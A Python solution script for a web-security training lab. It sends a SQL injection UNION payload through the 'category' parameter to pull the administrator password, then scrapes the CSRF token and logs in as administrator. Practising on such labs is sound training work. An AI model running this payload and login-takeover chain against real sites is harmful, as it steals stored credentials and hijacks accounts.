########################################################################
#
# Lab: SQL injection UNION attack, retrieving data from other tables
#
# Hack Steps:
#      1. Inject payload into 'category' query parameter to retrieve
#         administrator password from users table
#      2. Fetch the login page
#      3. Extract the csrf token and session cookie
#      4. Login as the administrator
#      5. Fetch the administrator profile
#
########################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0a80005c047177ba84a04cf6000e001d.web-security-academy.net"

def main():
    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")
    print(Fore.WHITE + "⦗1⦘ Retrieving administrator password from users table.. ", end="", flush=True)

    payload = f"' union SELECT username, password from users where username = 'administrator'-- -"
    injection = fetch(f"/filter?category={payload}")
    admin_password = re.findall("<td>(.*)</td>", injection.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
    print(Fore.WHITE + "⦗2⦘ Fetching the login page.. ", end="", flush=True)

    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Logging in as the administrator.. ", end="", flush=True)

    data = { "username": "administrator", "password": admin_password, "csrf": csrf_token }
    cookies = { "session": session }
    admin_login = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Fetching the administrator profile.. ", end="", flush=True)

    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()